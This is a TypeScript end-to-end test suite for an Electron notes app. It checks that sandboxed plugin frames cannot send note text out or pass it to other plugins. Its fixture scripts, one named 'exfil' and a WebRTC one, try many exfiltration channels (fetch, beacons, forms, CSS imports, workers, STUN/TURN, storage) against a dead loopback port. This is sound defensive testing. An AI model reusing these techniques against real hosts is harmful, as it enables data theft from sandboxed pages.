import { execFile } from 'node:child_process'
import { randomBytes } from 'node:crypto'
import { createSocket } from 'node:dgram'
import { appendFile, mkdir, readFile, writeFile } from 'node:fs/promises'
import { connect, createServer } from 'node:net'
import path from 'node:path'
import { promisify } from 'node:util'
import type { ElectronApplication, Page, Worker } from 'playwright'
import { afterEach, describe, expect, it } from 'vitest'
import type { Capability } from '../../api/capabilities.ts'
import { defaultSwitches, StateStore } from '../../backend/boot/state.ts'
import { partition, ROLES, type Role } from '../../backend/runtime/sessions.ts'
import { buildPlugin } from '../../sdk/build/esbuild.ts'
import { filesFor, workerManifest, writeFolder, writeApproved } from '../plugins-manager-fakes.ts'
import { cleanup, counting, editorPage, launch, logged, temp, tick, until, workersPage } from './helpers.ts'

const run = promisify(execFile)
afterEach(cleanup)

// HETU_PROBES=<file> appends what each case found, one JSON line each
async function found(probe: string, result: unknown): Promise<void> {
  const file = process.env.HETU_PROBES
  if (file !== undefined && file !== '') await appendFile(file, `${JSON.stringify({ probe, result })}\n`)
}

const PNG = Buffer.from('89504e470d0a1a0a0000000d49484452000000010000000108060000001f15c4890000000d4944415478da63f8cfc0f01f0005000201ab4f5e0b0000000049454e44ae426082', 'hex')

const sdk = path.join(import.meta.dirname, '..', '..', 'sdk', 'index.ts').split(path.sep).join('/')

// Each plugin's worker: records every ui event and hands its ctx to the test
const worker = `
import { definePlugin } from '${sdk}'
export default definePlugin({
  start(ctx) {
    const scope = globalThis as Record<string, unknown>
    scope.ctx = ctx
    const heard: unknown[] = []
    scope.heard = heard
    for (const topic of ['view.opened', 'view.message'] as const) ctx.ui.on(topic, event => heard.push(event))
  },
})
`
// A layout drawing each open view in a column beside the note's editor, again at every state
const columns = `
import { definePlugin } from '${sdk}'
export default definePlugin({
  start(ctx) {
    ctx.ui.on('layout.state', event => {
      void ctx.ui.layout.draw({ kind: 'box', id: 'root', style: { display: 'flex', height: '100%' }, children: [
        ...event.state.views.map(view => ({ kind: 'slot', id: 's-' + view.instance, instance: view.instance, style: { width: '300px' } })),
        { kind: 'editor', id: 'e', instance: 'current', style: { flex: '1' } },
      ] }).catch(() => {})
    })
  },
})
`
const page = (script: string) => `<!doctype html><html><head><meta charset="utf-8"><script src="${script}"></script></head><body><p>frame</p></body></html>`

// hetu with the columns layout and these plugins, each with one view drawn by its frame board.html among its files,
// the notes folder holding notes and each plugin granted to read the paths reads names. Answers once each plugin's
// frame has said hello
async function started(plugins: Record<string, Record<string, string>>, setup: { notes?: Record<string, Buffer>, reads?: string[] } = {}): Promise<{ app: ElectronApplication, editor: Page, dataDir: string, workers: Record<string, Worker> }> {
  const dataDir = await temp()
  const store = new StateStore(dataDir)
  await store.writeSwitches({ ...defaultSwitches(), off: [] })
  const folder = await temp()
  for (const [name, bytes] of Object.entries(setup.notes ?? {})) {
    await mkdir(path.dirname(path.join(folder, name)), { recursive: true })
    await writeFile(path.join(folder, name), bytes)
  }
  await store.writeLuoshu({ folder })
  const source = await temp()
  await writeFolder(source, { 'src/worker.ts': worker, 'src/columns.ts': columns })
  const [built] = await buildPlugin(source, { entries: { 'worker.js': 'src/worker.ts' }, workers: ['worker.js'], write: false })
  const granted: Capability[] = [{ type: 'ui.view' }, ...(setup.reads === undefined ? [] : [{ type: 'luoshu.read' as const, paths: setup.reads }])]
  for (const [id, files] of Object.entries(plugins)) {
    const manifest = workerManifest(id, {
      capabilities: granted,
      entries: { worker: 'worker.js', frames: { board: 'board.html' } },
      views: { board: { title: 'board', kind: 'view', frame: 'board' } },
    })
    const root = path.join(dataDir, 'plugins', id)
    await writeFolder(root, filesFor(manifest, { 'worker.js': built.text, 'icon.svg': '<svg xmlns="http://www.w3.org/2000/svg"/>', ...files }))
    await writeApproved(store, id, root, { granted })
  }
  const layout = path.join(dataDir, 'plugins', 'columns')
  const [drawn] = await buildPlugin(source, { entries: { 'worker.js': 'src/columns.ts' }, workers: ['worker.js'], write: false })
  const layoutGrants: Capability[] = [{ type: 'ui.layout' }]
  await writeFolder(layout, filesFor(workerManifest('columns', { capabilities: layoutGrants }), { 'worker.js': drawn.text }))
  await writeApproved(store, 'columns', layout, { granted: layoutGrants })
  const app = await launch(dataDir)
  const editor = await editorPage(app)
  for (const id of ['columns', ...Object.keys(plugins)]) await until(() => logged(dataDir, 'plugin.started', { plugin: id }))
  await editor.locator('#views').click()
  await until(async () => editor.locator('#menu').isVisible())
  await editor.locator('#menu select').first().selectOption('columns')
  await editor.locator('#menu-close').click()
  const workers: Record<string, Worker> = {}
  for (const id of Object.keys(plugins)) {
    const host = await workersPage(app, id)
    await until(() => host.workers().length === 1)
    workers[id] = host.workers()[0] as Worker
    await until(async () => (await messages(workers[id]!)).length >= 1)
  }
  return { app, editor, dataDir, workers }
}

type Heard = { topic: string, instance?: string, data?: unknown }
const messages = async (worker: Worker) => ((await worker.evaluate('globalThis.heard')) as Heard[]).filter(event => event.topic === 'view.message').map(event => event.data)
// The data goes in as evaluate's argument, so no code is built from it
const post = (worker: Worker, data: unknown) => worker.evaluate(async sent => {
  const scope = globalThis as unknown as { heard: Heard[], ctx: { ui: { views: { post(instance: string, data: unknown): Promise<void> } } } }
  const opened = scope.heard.find(event => event.topic === 'view.opened')!
  await scope.ctx.ui.views.post(opened.instance!, sent)
}, data)
// The first message the frame sends after this one is posted to it
async function ask(worker: Worker, data: unknown): Promise<Record<string, unknown>> {
  const before = (await messages(worker)).length
  await post(worker, data)
  await until(async () => (await messages(worker)).length > before)
  return (await messages(worker))[before] as Record<string, unknown>
}

// The net log of everything Chromium did while the run went. Every session sends through a proxy that leads nowhere,
// so a request that got out never reaches a listener the test owns and the log is where it shows. The control, last:
// with the editor session's request filter taken off, main asks for a URL through that session and the log holds it,
// so the log sees a request from the editor session behind that proxy. The filter stays off for the rest of the app's run
async function netLogged(app: ElectronApplication, run: () => Promise<void>): Promise<string> {
  const log = path.join(await temp(), 'net.json')
  const control = `http://127.0.0.1:9/control${randomBytes(6).toString('hex')}`
  await app.evaluate(({ netLog }, file) => netLog.startLogging(file, { captureMode: 'everything' }), log)
  await run()
  const answer = await app.evaluate(({ session }, [name, url]) => {
    const ses = session.fromPartition(name as string)
    ses.webRequest.onBeforeRequest(null)
    return ses.fetch(url as string).then(() => 'answered', (err: Error) => err.message)
  }, [partition('editor'), control])
  await app.evaluate(({ netLog }) => netLog.stopLogging())
  const text = await readFile(log, 'utf8')
  expect(answer).not.toBe('answered')
  expect(text).toContain(control)
  return text
}

// A note's image URL minted for the plugin as the editor page asks for one, not yet used
const imageTicket = (editor: Page, plugin: string, at: string) => editor.evaluate(([owner, file]) => new Promise<string>((resolve, reject) => {
  const bridge = (window as unknown as { hetu: { send(message: unknown): void, listen(listener: (message: unknown) => void): void } }).hetu
  const id = 1_000_000
  bridge.listen(message => {
    const got = message as { kind?: string, id?: number, ok?: boolean, result?: { url: string } }
    if (got.kind === 'reply' && got.id === id) {
      if (got.ok === true) resolve(got.result!.url)
      else reject(new Error(JSON.stringify(got)))
    }
  })
  bridge.send({ v: 1, kind: 'call', id, action: 'editor.image', args: { plugin: owner, path: file } })
}), [plugin, at])
// What the editor session's protocol handler answers for a URL, asked from main as the page's own loads are
const status = (app: ElectronApplication, url: string) =>
  app.evaluate(async ({ session }, [name, at]) => (await session.fromPartition(name as string).fetch(at as string)).status, [partition('editor'), url])

// The fixture plugin's frame: told where to by the test, tries every way out of its own files it has and reports what
// each saw. An outcome is load, read, open, ran or registered only when something got through
const exfil = `
function attempt(run) {
  return new Promise(function (resolve) {
    var settled = false
    function end(outcome) { if (!settled) { settled = true; resolve(outcome) } }
    setTimeout(function () { end('quiet') }, 2000)
    try { run(end) } catch (err) { end('threw ' + err.name) }
  })
}
function add(tag, attributes, parent) {
  var element = document.createElement(tag)
  for (var name in attributes) element.setAttribute(name, attributes[name])
  ;(parent || document.head).appendChild(element)
  return element
}
function loads(tag, attributes) {
  return attempt(function (end) {
    var element = add(tag, attributes, document.body)
    element.onload = function () { end('load') }
    element.onerror = function () { end('error') }
  })
}
function started(make) {
  return attempt(function (end) {
    var worker = make()
    var port = worker.port || worker
    port.onmessage = function () { end('ran') }
    if (worker.port) worker.port.start()
    worker.onerror = function () { end('error') }
  })
}
function ways(to) {
  var http = 'http://127.0.0.1:9/' + to.label + '/'
  return {
    fetch: attempt(function (end) { fetch(http + 'fetch').then(function (r) { return r.text() }).then(function (t) { end('read ' + t) }, function (err) { end('rejected ' + err.name) }) }),
    xhr: attempt(function (end) { var x = new XMLHttpRequest(); x.open('GET', http + 'xhr'); x.onload = function () { end('read ' + x.responseText) }; x.onerror = function () { end('error') }; x.send() }),
    websocket: attempt(function (end) { var w = new WebSocket('ws://127.0.0.1:9/' + to.label + '/ws'); w.onopen = function () { end('open') }; w.onerror = function () { end('error') } }),
    eventsource: attempt(function (end) { var s = new EventSource(http + 'es'); s.onopen = function () { end('open') }; s.onerror = function () { s.close(); end('error') } }),
    beacon: attempt(function (end) { end('returned ' + navigator.sendBeacon(http + 'beacon', 'note text')) }),
    form: attempt(function (end) { var f = add('form', { action: http + 'form', method: 'post' }, document.body); add('input', { name: 'note', value: 'note text' }, f); f.submit(); setTimeout(function () { end('quiet') }, 1000) }),
    open: attempt(function (end) { end(window.open(http + 'open') === null ? 'null' : 'open') }),
    top: attempt(function (end) { top.location.href = http + 'top'; end('assigned') }),
    prefetch: attempt(function (end) {
      add('link', { rel: 'prefetch', href: http + 'prefetch' }); add('link', { rel: 'preload', as: 'fetch', href: http + 'preload' })
      setTimeout(function () { end('quiet') }, 1500)
    }),
    iframe: attempt(function (end) { add('iframe', { src: http + 'iframe' }, document.body); setTimeout(function () { end('quiet') }, 1500) }),
    css: loads('link', { rel: 'stylesheet', href: 'exfil.css' }).then(function (own) {
      document.body.style.backgroundImage = 'url(' + http + 'cssom)'
      return new FontFace('out', 'url(' + http + 'font)').load().then(function () { return 'sheet ' + own + ', font load' }, function () { return 'sheet ' + own + ', font error' })
    }),
    editorScript: loads('script', { src: 'hetu://editor/page.js' }),
    editorStyle: loads('link', { rel: 'stylesheet', href: 'hetu://editor/shell.css' }),
    imagesHost: loads('img', { src: 'hetu://images/' + to.ticket }),
    otherIcon: loads('img', { src: 'hetu://' + to.other + '.views/icon/icon.svg' }),
    otherScript: loads('script', { src: to.otherScript }),
    worker: started(function () { return new Worker('w.js') }),
    blobWorker: started(function () { return new Worker(URL.createObjectURL(new Blob(['postMessage(1)'], { type: 'text/javascript' }))) }),
    sharedWorker: started(function () { return new SharedWorker('w.js') }),
    serviceWorker: attempt(function (end) {
      if (!navigator.serviceWorker) return end('absent')
      navigator.serviceWorker.register('w.js').then(function () { end('registered') }, function (err) { end('rejected ' + err.name) })
    }),
  }
}
// Each store a frame could hand another plugin's frame a note through: reads what is there and, given a note, writes it.
// Answers what each read or how it failed
function stores(note) {
  function each(run) {
    return new Promise(function (resolve) {
      try { Promise.resolve(run()).then(resolve, function (err) { resolve('rejected ' + err.name) }) } catch (err) { resolve('threw ' + err.name) }
    })
  }
  function database() {
    return new Promise(function (resolve, reject) {
      var opening = indexedDB.open('hetu', 1)
      opening.onupgradeneeded = function () { opening.result.createObjectStore('notes') }
      opening.onerror = function () { reject(opening.error) }
      opening.onsuccess = function () {
        var done = opening.result.transaction('notes', 'readwrite')
        var was = done.objectStore('notes').get('note')
        if (note) done.objectStore('notes').put(note, 'note')
        done.oncomplete = function () { resolve(was.result === undefined ? null : was.result) }
        done.onerror = function () { reject(done.error) }
      }
    })
  }
  function cache() {
    return caches.open('hetu').then(function (opened) {
      return opened.match('/note').then(function (found) { return found ? found.text() : null }).then(function (was) {
        return note ? opened.put('/note', new Response(note)).then(function () { return was }) : was
      })
    })
  }
  var runs = {
    local: function () { var was = localStorage.getItem('hetu'); if (note) localStorage.setItem('hetu', note); return was },
    session: function () { var was = sessionStorage.getItem('hetu'); if (note) sessionStorage.setItem('hetu', note); return was },
    cookie: function () { var was = document.cookie; if (note) document.cookie = 'hetu=' + note; return was },
    indexedDB: database,
    caches: cache,
  }
  var names = Object.keys(runs)
  return Promise.all(names.map(function (name) { return each(runs[name]) })).then(function (outcomes) {
    var found = {}
    names.forEach(function (name, i) { found[name] = outcomes[i] })
    return found
  })
}
var heard = []
var channel = null
window.addEventListener('message', function (event) {
  if (event.source !== parent || !event.ports[0]) return
  var port = event.ports[0]
  port.onmessage = function (message) {
    var data = JSON.parse(message.data)
    if (data.ways) {
      var all = ways(data.ways)
      var names = Object.keys(all)
      var own = loads('link', { rel: 'stylesheet', href: 'own.css' })
      Promise.all(names.map(function (name) { return all[name] }).concat([own])).then(function (outcomes) {
        var report = {}
        names.forEach(function (name, i) { report[name] = outcomes[i] })
        port.postMessage(JSON.stringify({ outcomes: report, own: outcomes[names.length] }))
      })
    }
    if (data.go) {
      window.addEventListener('pagehide', function () { navigator.sendBeacon(data.go + 'unload', 'note text') })
      if (data.refresh) add('meta', { 'http-equiv': 'refresh', content: '0;url=' + data.go + 'refresh' })
      else location.href = data.go + 'navigate'
    }
    if (data.listen) {
      channel = new BroadcastChannel('hetu')
      channel.onmessage = function (e) { heard.push(e.data) }
      var own = new BroadcastChannel('hetu')
      own.postMessage('own')
      setTimeout(function () { own.close(); port.postMessage(JSON.stringify({ listening: true })) }, 500)
    }
    if (data.send) {
      var sending = new BroadcastChannel('hetu')
      sending.postMessage(data.send)
      stores(data.send).then(function (sent) { port.postMessage(JSON.stringify({ sent: sent })) })
    }
    if (data.read) stores(null).then(function (stored) { port.postMessage(JSON.stringify({ heard: heard, stored: stored })) })
  }
  port.postMessage(JSON.stringify({ hello: location.host }))
})
`
const exfilCss = (label: string) => `@import url("http://127.0.0.1:9/${label}/import.css");
@font-face { font-family: out; src: url("http://127.0.0.1:9/${label}/face.woff2"); }
body { background-image: url("http://127.0.0.1:9/${label}/css-url.png"); font-family: out; }
`
const exfilFiles = (label: string) => ({ 'board.html': page('exfil.js'), 'exfil.js': exfil, 'exfil.css': exfilCss(label), 'own.css': 'p { color: rgb(1, 2, 3) }', 'w.js': 'postMessage(1)' })
// What got through: an outcome that loaded, read, opened, ran, registered or moved the top page
const through = (outcomes: Record<string, string>) => Object.entries(outcomes).filter(([, outcome]) => /^(load|read|open|ran|registered|assigned)|load$/.test(outcome))
const label = () => `hetu${randomBytes(6).toString('hex')}`

describe('a view frame on its plugin\'s host', () => {
  // The frame's sandbox, with no allow-forms, allow-popups or allow-top-navigation, stops a form, a popup and top
  // navigation before the CSP's form-action, the window open handler or will-navigate are asked
  it('reaches nothing outside its plugin\'s files by any request, page, worker or load from hetu\'s other hosts', async () => {
    const marked = label()
    const { app, editor, workers } = await started(
      { kanban: exfilFiles(marked), other: { 'board.html': page('other.js'), 'other.js': exfil } },
      { notes: { 'pics/dot.png': PNG }, reads: ['pics/**'] },
    )
    const frames = await app.evaluate(({ webContents }) => webContents.getAllWebContents().flatMap(contents => contents.mainFrame.framesInSubtree.map(frame => frame.url)))
    const otherBoard = frames.find(url => url.startsWith('hetu://other.views/'))!
    let report: Record<string, unknown> = {}
    let unused = 0
    const text = await netLogged(app, async () => {
      const ticket = await imageTicket(editor, 'kanban', 'pics/dot.png')
      report = await ask(workers.kanban!, { ways: { label: marked, ticket: ticket.slice('hetu://images/'.length), other: 'other', otherScript: otherBoard.replace(/board\.html$/, 'other.js') } })
      // The frame's image took nothing from the images host: the URL it was handed still loads, once
      unused = await status(app, ticket)
      await tick(1000)
      // The editor page is still where it was and the frame still answers
      expect(await app.evaluate(({ webContents }) => webContents.getAllWebContents().some(contents => contents.getURL() === 'hetu://editor/'))).toBe(true)
      expect(await ask(workers.kanban!, { read: true })).toHaveProperty('stored')
    })
    const outcomes = report.outcomes as Record<string, string>
    await found('ways out', report)
    expect(Object.keys(outcomes)).toHaveLength(20)
    expect(through(outcomes)).toEqual([])
    // A stylesheet of the frame's own loads, so the loads it is refused are refused for where they come from. Its
    // exfil.css fails to load as a whole, since a stylesheet whose @import fails fires error
    expect(report.own).toBe('load')
    expect(outcomes.fetch).toBe('rejected TypeError')
    expect(outcomes.imagesHost).toBe('error')
    expect(unused).toBe(200)
    expect(text).not.toContain(marked)
  })

  it('reaches nothing when it navigates itself to the network, and is removed', async () => {
    const marked = label()
    const { app, workers, dataDir } = await started({ kanban: exfilFiles(marked), other: { 'board.html': page('exfil.js'), 'exfil.js': exfil } })
    const go = `http://127.0.0.1:9/${marked}/`
    const text = await netLogged(app, async () => {
      // Each page sends a beacon as it goes, one by a link followed and one by a meta refresh
      await post(workers.kanban!, { go })
      await post(workers.other!, { go, refresh: true })
      for (const plugin of ['kanban', 'other']) await until(() => logged(dataDir, 'frame.navigated', { plugin }))
      await tick(1500)
    })
    expect(text).not.toContain(marked)
  })

  it('hands another plugin\'s frame nothing by a broadcast or a store', async () => {
    const { workers } = await started({ kanban: exfilFiles(label()), other: { 'board.html': page('exfil.js'), 'exfil.js': exfil } })
    expect(await ask(workers.other!, { listen: true })).toEqual({ listening: true })
    const note = `note${randomBytes(6).toString('hex')}`
    const { sent } = await ask(workers.kanban!, { send: note }) as { sent: Record<string, unknown> }
    await tick(500)
    const read = await ask(workers.other!, { read: true }) as { heard: string[], stored: Record<string, unknown> }
    await found('between plugins', { sent, read })
    // Every store refuses the sender itself, so a store open to a frame shows here before any other frame reads it.
    // indexedDB refuses inside the promise that opens it
    const refused = 'threw SecurityError'
    expect(sent).toEqual({ local: refused, session: refused, cookie: refused, indexedDB: 'rejected SecurityError', caches: refused })
    // The frame hears its own channel, so a broadcast from the other plugin would have been heard
    expect(read.heard).toEqual(['own'])
    expect(JSON.stringify(read.stored)).not.toContain(note)
  })
})

// A frame's script that, sent ICE servers, opens a peer connection to each and offers, as an artifact sending a note
// out through WebRTC would. Sent an mDNS name as well, it hands a second connection a remote candidate on <name>.local.
// It reports each connection's gathering state 3 s later, once for each time it is sent servers
const rtc = `
function offered(server) {
  var connection = new RTCPeerConnection({ iceServers: [server] })
  connection.createDataChannel('out')
  return connection.createOffer().then(function (offer) { return connection.setLocalDescription(offer) }).then(function () { return connection })
}
function remote(name) {
  var offerer = new RTCPeerConnection()
  offerer.createDataChannel('out')
  var answerer = new RTCPeerConnection()
  return offerer.createOffer().then(function (offer) { return answerer.setRemoteDescription(offer) }).then(function () {
    return answerer.addIceCandidate({ candidate: 'candidate:1 1 udp 2122260223 ' + name + '.local 54321 typ host', sdpMid: '0', sdpMLineIndex: 0 })
  }).then(function () {
    offerer.close()
    return answerer
  })
}
window.addEventListener('message', function (event) {
  if (event.source !== parent || !event.ports[0]) return
  var port = event.ports[0]
  port.onmessage = function (message) {
    var data = JSON.parse(message.data)
    if (!data || !Array.isArray(data.servers)) return
    var opening = data.servers.map(offered)
    if (typeof data.mdns === 'string') opening.push(remote(data.mdns))
    Promise.all(opening).then(function (opened) {
      setTimeout(function () {
        port.postMessage(JSON.stringify({ tried: opened.map(function (connection) { return connection.iceGatheringState }) }))
        opened.forEach(function (connection) { connection.close() })
      }, 3000)
    }, function (err) { port.postMessage(JSON.stringify({ failed: String(err) })) })
  }
  port.postMessage(JSON.stringify({ hello: location.pathname }))
})
`
const rtcFiles = { kanban: { 'board.html': page('rtc.js'), 'rtc.js': rtc } }

type RtcReport = { tried?: string[], failed?: string }
const isReport = (data: unknown) => (data as RtcReport).tried !== undefined || (data as RtcReport).failed !== undefined

// What the frame reported after its peer connections tried to reach the ICE servers it was sent this time
async function rtcReport(worker: Worker, servers: object[], mdns?: string): Promise<RtcReport> {
  await until(async () => (await messages(worker)).length >= 1)
  const before = (await messages(worker)).filter(isReport).length
  await post(worker, mdns === undefined ? { servers } : { servers, mdns })
  await until(async () => (await messages(worker)).filter(isReport).length > before)
  return (await messages(worker)).filter(isReport)[before] as RtcReport
}

describe('WebRTC from a view frame', () => {
  it('sends no STUN packet over UDP to a server on loopback, with the policy set on every web contents', async () => {
    const stun = createSocket('udp4')
    let packets = 0
    stun.on('message', () => packets++)
    await new Promise<void>(resolve => stun.bind(0, '127.0.0.1', resolve))
    try {
      const { app, workers: { kanban: worker } } = await started(rtcFiles)
      const report = await rtcReport(worker, [{ urls: `stun:127.0.0.1:${stun.address().port}` }])
      expect(report).toEqual({ tried: [expect.any(String)] })
      expect(packets).toBe(0)
      const policies = await app.evaluate(({ webContents }) => webContents.getAllWebContents().map(contents => contents.getWebRTCIPHandlingPolicy()))
      expect(policies.length).toBeGreaterThanOrEqual(2)
      expect(new Set(policies)).toEqual(new Set(['disable_non_proxied_udp']))
      // The control: with the editor's policy back to Chromium's default, the same frame's STUN reaches the listener
      await app.evaluate(({ webContents }) => {
        for (const contents of webContents.getAllWebContents()) if (contents.getURL() === 'hetu://editor/') contents.setWebRTCIPHandlingPolicy('default')
      })
      await rtcReport(worker, [{ urls: `stun:127.0.0.1:${stun.address().port}` }])
      await until(() => packets > 0, 5000)
    } finally {
      stun.close()
    }
  })

  it('opens no TURN connection over TCP to a server on loopback, with every session behind a proxy that leads nowhere', async () => {
    let connections = 0
    const turn = createServer(socket => {
      connections++
      socket.destroy()
    })
    await new Promise<void>(resolve => turn.listen(0, '127.0.0.1', resolve))
    try {
      const { app, workers: { kanban: worker } } = await started(rtcFiles)
      const { port } = turn.address() as { port: number }
      const report = await rtcReport(worker, [{ urls: `turn:127.0.0.1:${port}?transport=tcp`, username: 'note text', credential: 'x' }])
      expect(report).toEqual({ tried: [expect.any(String)] })
      expect(connections).toBe(0)
      const partitions = (Object.keys(ROLES) as Role[]).map(partition)
      const proxies = await app.evaluate(({ session }, names) => Promise.all([session.defaultSession, ...names.map(name => session.fromPartition(name))]
        .flatMap(each => ['http://127.0.0.1/', 'https://example.com/'].map(url => each.resolveProxy(url)))), partitions)
      expect(proxies).toHaveLength(8)
      expect(new Set(proxies)).toEqual(new Set(['SOCKS5 127.0.0.1:1']))
      // With the editor session going direct the frame still reaches nothing, since Chromium resolves no host, an IP
      // literal included. The listener itself hears a connection from here
      await app.evaluate(({ session }, name) => session.fromPartition(name).setProxy({ mode: 'direct' }), partition('editor'))
      await rtcReport(worker, [{ urls: `turn:127.0.0.1:${port}?transport=tcp`, username: 'note text', credential: 'x' }])
      expect(connections).toBe(0)
      await new Promise<void>(resolve => connect(port, '127.0.0.1').on('close', () => resolve()).on('error', () => resolve()))
      expect(connections).toBe(1)
    } finally {
      turn.close()
    }
  })

  it('resolves no host name in Chromium for any session, while main\'s own fetch still resolves localhost through Node', async () => {
    const server = await counting()
    const { app } = await started(rtcFiles)
    const fetched = await app.evaluate(async (_electron, url) => (await fetch(url)).text(), server.url.replace('127.0.0.1', 'localhost'))
    expect(fetched).toBe('reached')
    expect(server.hits()).toBe(1)
    const partitions = (Object.keys(ROLES) as Role[]).map(partition)
    const answers = await app.evaluate(({ session }, names) => Promise.all([session.defaultSession, ...names.map(name => session.fromPartition(name))]
      .flatMap(each => [each.resolveHost('localhost'), each.resolveHost('127.0.0.1'), each.resolveHost('hetu-probe.invalid'), each.resolveHost('hetu-probe.local', { source: 'mdns' })])
      .map(lookup => lookup.then(found => `resolved ${JSON.stringify(found)}`, (err: Error) => err.message))), partitions)
    expect(answers).toHaveLength(16)
    for (const answer of answers) expect(answer).toMatch(/ERR_NAME_NOT_RESOLVED/)
  })

  // A remote mDNS candidate is the packets test's, since its query goes out on the real interfaces under a mapped name
  it('looks up no name a frame gives as a TURN or STUN server, by the net log', async () => {
    const label = `hetu${randomBytes(6).toString('hex')}`
    const { app, workers: { kanban: worker } } = await started(rtcFiles)
    const log = path.join(await temp(), 'net.json')
    await app.evaluate(({ netLog }, file) => netLog.startLogging(file, { captureMode: 'everything' }), log)
    const report = await rtcReport(worker, [
      { urls: `turn:${label}t.hetu-probe.invalid:3478?transport=tcp`, username: 'note text', credential: 'x' },
      { urls: `stun:${label}s.hetu-probe.invalid:3478` },
    ])
    expect(report).toEqual({ tried: [expect.any(String), expect.any(String)] })
    await app.evaluate(({ netLog }) => netLog.stopLogging())
    const text = await readFile(log, 'utf8')
    expect(text).toContain('"constants"')
    expect({ turn: text.includes(`${label}t`), stun: text.includes(`${label}s`) }).toEqual({ turn: false, stun: false })
  })
})

// The sockets the given processes hold on an address other than loopback: UDP endpoints and TCP sockets in any state,
// looked at every 300 ms for about 4 s
async function openSockets(pids: number[]): Promise<string[]> {
  const found = new Set<string>()
  const local = /^(127\.|::1$|\[::1\]|localhost)/
  if (process.platform === 'win32') {
    const script = `$p = @(${pids.join(',')}); foreach ($i in 1..13) {
      Get-NetUDPEndpoint | Where-Object { $p -contains $_.OwningProcess } | ForEach-Object { "udp $($_.LocalAddress) $($_.LocalPort)" }
      Get-NetTCPConnection -ErrorAction SilentlyContinue | Where-Object { $p -contains $_.OwningProcess } | ForEach-Object { "tcp $($_.LocalAddress) $($_.LocalPort)" }
      Start-Sleep -Milliseconds 300 }`
    const { stdout } = await run('powershell.exe', ['-NoProfile', '-NonInteractive', '-Command', script])
    for (const line of stdout.split(/\r?\n/)) if (line !== '') found.add(line)
  } else {
    for (let i = 0; i < 13; i++) {
      // lsof exits 1 when the processes hold no socket at all
      const { stdout } = await run('lsof', ['-i', '-n', '-P', '-a', '-p', pids.join(',')]).catch((err: { stdout?: string }) => ({ stdout: err.stdout ?? '' }))
      for (const line of stdout.split('\n').slice(1)) {
        const [, , , , , , , protocol, name] = line.trim().split(/\s+/)
        if (protocol !== undefined && name !== undefined) found.add(`${protocol.toLowerCase()} ${name.replace(/->.*$/, '').replace(/:(\d+|\*)$/, ' $1')}`)
      }
      await tick(300)
    }
  }
  return [...found].filter(entry => !local.test(entry.split(' ')[1]!))
}

const onWindows = process.platform === 'win32'
// UDP 5353 is mDNS, which Chromium's network service asks and answers on for WebRTC with its mDNS hiding on
const onMdnsPort = (entry: string) => entry.endsWith(' 5353')

// Each expected failure below holds only its last expect. What it stands on runs as a plain test before it, so a
// start, a report or a capture going wrong fails the run instead of passing as the expected failure
describe('the sockets of a frame\'s WebRTC', () => {
  let open: string[] | undefined
  it.runIf(onWindows)('finds no hetu process holding a socket off loopback before a frame offers, then the frame offering', async () => {
    const stun = createSocket('udp4')
    await new Promise<void>(resolve => stun.bind(0, '127.0.0.1', resolve))
    try {
      const { app, workers: { kanban: worker } } = await started(rtcFiles)
      const pids = await app.evaluate(({ app: electronApp }) => electronApp.getAppMetrics().map(metric => metric.pid))
      expect(pids.length).toBeGreaterThanOrEqual(4)
      // The baseline: the frame loaded and no peer connection made yet
      expect(await openSockets(pids)).toEqual([])
      const [seen, report] = await Promise.all([openSockets(pids), rtcReport(worker!, [{ urls: `stun:127.0.0.1:${stun.address().port}` }])])
      expect(report).toEqual({ tried: [expect.any(String)] })
      await found('open sockets', seen)
      open = seen
    } finally {
      stun.close()
    }
  })
  // With WebRTC's mDNS hiding on, Chromium's network service bound UDP 5353 on 0.0.0.0 and :: for its mDNS responder.
  // The look every 300 ms can miss a short bind, so the packets test checks binds by the net log as well
  it.runIf(onWindows)('leaves no hetu process holding the mDNS port 5353 while a frame offers', () => {
    expect(open?.filter(onMdnsPort)).toEqual([])
  })
  // Accepted as it stands: libwebrtc binds a UDP pair on 0.0.0.0 and :: for each peer connection's gathering, under
  // disable_non_proxied_udp, and holds it for the connection's life. It sends nothing and what it reads reaches nothing.
  // No switch or policy in the app stops it and it raises the firewall's prompt. Fails while the pair is there
  // TODO: run the socket and packet tests on macOS once checked there
  it.runIf(onWindows).fails('leaves no hetu process holding a socket on an address other than loopback while a frame offers', () => {
    expect(open?.filter(entry => !onMdnsPort(entry))).toEqual([])
  })
})

// While the frame tried what it was sent, by the net log: the addresses other than loopback the network service sent UDP
// to and the local addresses it bound a UDP socket on the mDNS port at. The log holds every bind, however short, where
// a look at the sockets every 300 ms can miss one
async function udpByNetLog(app: ElectronApplication, worker: Worker, servers: object[], mdns?: string): Promise<{ sent: string[], mdns: string[] }> {
  const log = path.join(await temp(), 'net.json')
  await app.evaluate(({ netLog }, file) => netLog.startLogging(file, { captureMode: 'everything' }), log)
  const report = await rtcReport(worker, servers, mdns)
  await app.evaluate(({ netLog }) => netLog.stopLogging())
  expect(report).toEqual({ tried: [expect.any(String)] })
  const { constants, events } = JSON.parse(await readFile(log, 'utf8')) as { constants: { logEventTypes: Record<string, number> }, events: { type: number, params?: { address?: string } }[] }
  expect(constants.logEventTypes.UDP_BYTES_SENT).toEqual(expect.any(Number))
  expect(constants.logEventTypes.UDP_LOCAL_ADDRESS).toEqual(expect.any(Number))
  const addresses = (type: number | undefined) => events.filter(event => event.type === type).map(event => event.params?.address ?? '')
  return {
    sent: addresses(constants.logEventTypes.UDP_BYTES_SENT).filter(address => !/^(127\.|\[::1\])/.test(address)),
    mdns: addresses(constants.logEventTypes.UDP_LOCAL_ADDRESS).filter(address => address.endsWith(':5353')),
  }
}

// With WebRTC's mDNS hiding on, a remote candidate on <name>.local made Chromium's network service send an mDNS query
// for ~NOTFOUND, the name host-resolver-rules maps it to, to 224.0.0.251 and ff02::fb on every interface when the frame
// said, from sockets on 5353 that also read the LAN's mDNS traffic
describe('the packets of a frame\'s WebRTC', () => {
  it.runIf(onWindows)('sends nothing off loopback and binds nothing on the mDNS port 5353 while a frame offers a peer connection or hands a remote mDNS candidate, by the net log', async () => {
    const { app, workers: { kanban: worker } } = await started(rtcFiles)
    // A peer connection offering to a STUN server on loopback, under the policy, sends nothing anywhere
    const offered = await udpByNetLog(app, worker!, [{ urls: 'stun:127.0.0.1:9' }])
    const handed = await udpByNetLog(app, worker!, [], `hetu${randomBytes(6).toString('hex')}`)
    await found('udp by the net log', { offered, handed })
    expect({ offered, handed }).toEqual({ offered: { sent: [], mdns: [] }, handed: { sent: [], mdns: [] } })
  })
})
